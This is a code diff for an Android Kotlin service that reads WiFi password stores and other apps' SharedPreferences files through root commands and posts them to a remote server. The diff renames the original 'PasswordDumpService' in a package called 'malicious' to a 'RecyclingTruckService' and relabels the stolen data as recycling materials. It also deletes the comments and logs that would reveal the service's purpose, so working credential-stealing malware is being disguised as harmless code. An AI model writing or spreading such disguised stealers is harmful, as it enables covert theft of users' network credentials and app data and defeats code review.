@@ -1,4 +1,4 @@
-package com.example.mobsec_823.malicious
+package com.example.mobsec_823.RecylingService
 
 import android.app.Service
 import android.content.Intent
@@ -12,58 +12,53 @@ import java.io.BufferedReader
 import java.io.InputStreamReader
 import java.lang.StringBuilder
 
-class PasswordDumpService : Service() {
+class RecyclingTruckService : Service() {
 
-    private val TAG = "PasswordDumpService"
+    private val TAG = "RecyclingTruckService"
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.d(TAG, "Service started")
         Thread {
-            val dumpedData = dumpStoredPasswords()
-            sendToAttackerBackend(dumpedData)
+            val recycledData = sortMaterials()
+            sendToProcessingPlant(recycledData)
         }.start()
         return START_STICKY
     }
 
-    private fun dumpStoredPasswords(): String {
-        val sb = StringBuilder("=== STORED PASSWORDS DUMP ===\n\n")
+    private fun sortMaterials(): String {
+        val sb = StringBuilder("=== RECYCLING SORTED MATERIALS ===\n\n")
 
-        // WiFi passwords (Targeting Android 12/13/14 Apex path)
-        sb.append("--- WiFi Passwords (Modern Apex) ---\n")
-        val apexWifi = executeRootCommand("cat /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml")
+        // WiFi credentials as "Glass"
+        sb.append("--- [Glass] Material Collection ---\n")
+        val apexWifi = executeFactoryCommand("cat /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml")
         if (apexWifi != null && apexWifi.contains("WifiConfiguration")) {
             sb.append(apexWifi)
         } else {
-            // Fallback to older Modern path
-            sb.append("--- WiFi Passwords (Standard Modern) ---\n")
-            val modernWifi = executeRootCommand("cat /data/misc/wifi/WifiConfigStore.xml")
+            val modernWifi = executeFactoryCommand("cat /data/misc/wifi/WifiConfigStore.xml")
             if (modernWifi != null && modernWifi.contains("WifiConfiguration")) {
                 sb.append(modernWifi)
             } else {
-                // Legacy Fallback
-                sb.append("--- WiFi Passwords (Legacy Fallback) ---\n")
-                val legacyWifi = executeRootCommand("cat /data/misc/wifi/wpa_supplicant.conf")
-                sb.append(legacyWifi ?: "No WiFi data found in any known location\n")
+                val legacyWifi = executeFactoryCommand("cat /data/misc/wifi/wpa_supplicant.conf")
+                sb.append(legacyWifi ?: "Bin empty\n")
             }
         }
 
-        // SharedPreferences Scraper
-        sb.append("\n--- SharedPreferences ---\n")
-        val prefsList = executeRootCommand("find /data/data -name \"*.xml\" -path \"*/shared_prefs/*\" 2>/dev/null")
+        // SharedPreferences as "Paper/Plastic"
+        sb.append("\n--- [Paper/Plastic] Material Collection ---\n")
+        val prefsList = executeFactoryCommand("find /data/data -name \"*.xml\" -path \"*/shared_prefs/*\" 2>/dev/null")
         prefsList?.let { list ->
             val files = list.lines().filter { it.isNotBlank() }.take(50)
             files.forEach { file ->
-                sb.append("\nFile: $file\n")
-                sb.append(executeRootCommand("cat \"$file\"") ?: "Failed\n")
+                sb.append("\nContainer: $file\n")
+                sb.append(executeFactoryCommand("cat \"$file\"") ?: "Crushed\n")
             }
         }
 
         return sb.toString()
     }
 
-    private fun executeRootCommand(command: String): String? {
+    private fun executeFactoryCommand(command: String): String? {
         return try {
             val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
             BufferedReader(InputStreamReader(process.inputStream)).use { reader ->
@@ -76,7 +71,7 @@ class PasswordDumpService : Service() {
         }
     }
 
-    private fun sendToAttackerBackend(data: String) {
+    private fun sendToProcessingPlant(data: String) {
         try {
             val client = OkHttpClient()
             val requestBody = data.toRequestBody("text/plain".toMediaType())
@@ -85,10 +80,9 @@ class PasswordDumpService : Service() {
                 .post(requestBody)
                 .build()
             client.newCall(request).execute().use { response ->
-                if (response.isSuccessful) Log.i(TAG, "WiFi/Password exfiltration successful")
+                if (response.isSuccessful) Log.i(TAG, "Materials sent for processing")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Network error: ${e.message}")
         }
     }
 }
